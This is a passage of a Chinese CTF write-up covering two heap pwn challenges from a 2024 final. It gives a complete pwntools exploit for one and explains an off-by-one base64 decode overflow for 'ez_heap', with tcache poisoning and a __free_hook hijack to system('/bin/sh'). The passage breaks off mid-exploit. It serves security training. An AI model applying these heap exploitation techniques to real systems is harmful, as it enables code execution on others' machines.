class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.encrypt(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">data</span>):</span><br><span class="line">    key=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">16</span></span><br><span class="line">    cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(data)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./heap&#x27;</span>,aslr=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;47.94.85.95&#x27;,28760)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/xia0ji233/pwn/tools/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\nP&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1233</span></span><br><span class="line">success(<span class="string">&#x27;code_base: &#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x8</span>+<span class="number">6</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p8(<span class="number">0xa0</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">16</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line">heap_addr=u64(res[<span class="number">8</span>:])-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&#x27;heap_addr: &#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,decrypt(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0x431</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>)[:<span class="number">48</span>])</span><br><span class="line">add(<span class="number">14</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">free(<span class="number">14</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x350</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    add(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">data=p.recv(<span class="number">32</span>)</span><br><span class="line">res=encrypt(data)</span><br><span class="line"><span class="comment">#print(res.hex())</span></span><br><span class="line">libc_addr=u64(res[<span class="number">8</span>*<span class="number">3</span>:<span class="number">8</span>*<span class="number">4</span>])-<span class="number">0x215be0</span>+<span class="number">0x029000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">7</span>,decrypt(<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x20</span>))</span><br><span class="line">book=code_base+<span class="number">0x4080</span> </span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x18</span>)+p64(book+<span class="number">0x18</span>-<span class="number">0x10</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>))<span class="comment">#+p64(0x30)+p64(0xc0)))</span></span><br><span class="line">edit(<span class="number">14</span>,decrypt(p64(<span class="number">0x30</span>)+p64(<span class="number">0xc0</span>)))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,decrypt(p64(code_base+<span class="number">0x4100</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>])))</span><br><span class="line"><span class="comment">#edit(0,decrypt(p32(0x10)*4))</span></span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0x10</span>)*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">res=encrypt(p.recv(<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(res.<span class="built_in">hex</span>())</span><br><span class="line">stack=u64(res[:<span class="number">8</span>])-<span class="number">0x138</span></span><br><span class="line">success(<span class="string">&#x27;stack: &#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(4,decrypt(b&#x27;a&#x27;*0x20))</span></span><br><span class="line">leave=code_base+<span class="number">0x1AA4</span></span><br><span class="line">pop_rdi=libc_addr+<span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi=libc_addr+<span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret_10=libc_addr+<span class="number">0x00000000000dfc12</span></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0xa0</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x10</span>))</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment">#add(4,decrypt(p64(pop_rdi)))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x4350</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x360</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(heap_addr+<span class="number">0x4350</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;open&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x390</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3c0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)+p64(heap_addr)+p64(pop_rdx_ret_10)+p64(<span class="number">0x30</span>)))</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_addr+<span class="number">0x3e0</span>+<span class="number">0x30</span>))</span><br><span class="line">edit(<span class="number">0</span>,decrypt(p64(libc_addr+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(pop_rdi+<span class="number">1</span>)))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(stack))</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *0x555555555aa4&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x358</span>)+p64(leave)[:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里插个题外话，可能纯做 Pwn 的师傅不太清楚，Crypto 这个库安装使用以下命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install cryptodome</span><br></pre></td></tr></table></figure><h2 id="ez-heap"><a href="#ez-heap" class="headerlink" title="ez_heap"></a>ez_heap</h2><p><a href="ez_heap_c39239d7dd7612062b2f9a864512e346.zip">附件下载</a></p><p>环境准备就不过多赘述了，道理都是一样的。</p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>堆菜单实现了存储 base64 编码和解码的增删查，虽然说菜单上看着有改的操作，也确实有对应的函数，但是没有实装。</p><img src="/2024/12/08/qwb2024_final/16.png" class=""><p>同样的，也来分析这些函数。</p><h4 id="base64编码增"><a href="#base64编码增" class="headerlink" title="base64编码增"></a>base64编码增</h4><img src="/2024/12/08/qwb2024_final/17.png" class=""><p>根据输入的长度和回车的判断，去分配堆块，而这里分配的长度是 <code>4*len/3 + 4</code>，还算是留有余地，几乎不能够溢出。</p><h4 id="base64解码增"><a href="#base64解码增" class="headerlink" title="base64解码增"></a>base64解码增</h4><img src="/2024/12/08/qwb2024_final/18.png" class=""><p>这里需要注意的点来了，它这里分配的长度是 <code>3*len/4</code>，这个长度比较极限但是它如果强制要求你的 len 必须是 4 的倍数其实也不能利用，但是没有，所以这里打个 tag，后续着重分析这里的解码函数。</p><h4 id="base64编码删"><a href="#base64编码删" class="headerlink" title="base64编码删"></a>base64编码删</h4><img src="/2024/12/08/qwb2024_final/19.png" class=""><p>删不存在 UAF。</p><hr><p>后面的base64解码删，和输出堆块就不一一演示了，都很正常的实现。</p><p>这里想起之前讲到的 base64 解码增，来看看解码函数的实现。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">base64decode</span><span class="params">(<span class="type">char</span> *a1, <span class="type">unsigned</span> __int64 len, <span class="type">char</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//一大堆定义</span></span><br><span class="line">  v16 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt;= len )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    *a3 = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + (v13 &lt;&lt; <span class="number">18</span>) + v9) &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    a3[<span class="number">1</span>] = ((v15 &lt;&lt; <span class="number">6</span>) + (v14 &lt;&lt; <span class="number">12</span>) + v9) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    a3[<span class="number">2</span>] = (v15 &lt;&lt; <span class="number">6</span>) + v9;</span><br><span class="line">    a3 += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把中间一大段去掉，保留收尾，可以发现循环条件是 v16&gt;&#x3D;len，而 a3 的输出指针每次 +3，因此这个函数在输入长度为 4 的倍数的时候是绝对好使的，但是输入是由我们控制的，因此长度可以不为 4 的倍数，而不为 4 的倍数可能会导致分配的空间不够从而导致溢出。</p><h3 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h3><p>首先进行漏洞的验证。</p><p>交互函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><p>首先看看编码一个 0x19 长度的字符串，但是去掉编码后的最后一个字节，我们来计算一下。</p><p>0x19 长度的字符编码之后应该是 0x24 字节，去掉一个字节变成 0x23 字节，然后这个长度进入选项 2，malloc 的参数为 <code>0x23/4*3</code>，即得到 0x18，所以最终分配得到 0x20 大小的 <code>chunk</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x19</span>)[:-<span class="number">1</span>])<span class="comment">#0</span></span><br></pre></td></tr></table></figure><p>可以发现，最终的 top chunk 的 size 明显出了问题</p><img src="/2024/12/08/qwb2024_final/20.png" class=""><p>需要分析一下为什么出现了 410061 这样奇怪的值，图中可以看出来我的输入是 <code>YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQ=</code>，最小化之后发现主要的问题就是 <code>YQ=</code> 解析成了 <code>61 00 41</code> 这样的字节，来看看原理。</p><p><code>YQ</code> 解析成第一个 <code>a</code> 不奇怪，<code>Q=</code> 解析出第二个 <code>00</code> 也不奇怪，这个 <code>=</code> 和另外一个字节（0字节）解析成了 <code>A</code>，来看看为什么。</p><p>看到对最后一个字节的解析</p><img src="/2024/12/08/qwb2024_final/21.png" class=""><p>它使用 <code>strchr</code> 去查找该字符串在 base 表所处的位置，对于这个函数来说，如果如果找到了则返回该字符的指针，如果找不到返回 NULL，而找零字节能不能找到呢？能！就在字符串最后面，所有字符串都是 0 结尾的，所以找到的末尾指针减去首指针得到了 0x41，而 &#x3D; 又等同于 0，因此看到 <code>a[2]=(v15&lt;&lt;6)+v9</code>，也能理所当然地知道为啥是 <code>A</code> 了。</p><p>但是这样不太自由，因为会写 size 三个字节，因此可以考虑扩展长度，让它只能溢出一个 A 字节，这样这个 A 就能被覆盖到 size 里面构造堆重叠，然后打 tcache bin attack劫持 free hook就行了。</p><hr><p>所以还是先泄露地址，这里虽然限制了 0x400，但是别忘了 base64编码可以扩展长度，因此很轻松构造一个unsorted bin来泄露地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br></pre></td></tr></table></figure><p>这里还有一个需要注意的点，你泄露的 libc 的地址很不幸最低 2 位十六进制都是 0，所以 puts 带不出来，因此需要多覆盖一个字节才行。</p><img src="/2024/12/08/qwb2024_final/22.png" class=""><p>libc 地址有了后面就是简单的重叠堆构造 uaf，但同样需要注意 tcache bin 有数量检测，如果正常 free 一个 tcache 再修改 fd，则分配不出来这个任意地址的 tcache，必须要free两个堆块，然后再 edit 后进入的堆块才能够成功分配出来。</p><p>分配出来就直接打 tcache bin 写 system 即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span class="number">3</span>)</span><br><span class="line">free2(<span class="number">1</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)[:-<span class="number">1</span>])<span class="comment">#1</span></span><br><span class="line">free2(<span class="number">2</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(libc_addr+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])))<span class="comment">#2</span></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))<span class="comment">#3</span></span><br><span class="line">add2(base64.b64encode(p64(libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>])))</span><br><span class="line">free2(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><img src="/2024/12/08/qwb2024_final/23.png" class=""><p>至此艺术已成。</p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># p=remote(&#x27;47.94.85.95&#x27;,&#x27;37083&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter your choice: &#x27;</span>,<span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">content</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;: &#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free1</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show2</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">8</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>)<span class="comment">#1</span></span><br><span class="line">free1(<span class="number">0</span>)</span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x9</span>))<span class="comment">#0</span></span><br><span class="line">show2(<span class="number">0</span>)</span><br><span class="line">libc_addr=(u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)&amp;<span class="number">0xFFFFFFFFFFFFFF000</span>)-<span class="number">0x1ed000</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line">add2(base64.b64encode(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>))<span class="comment">#1</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">add2(<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">free2(<span 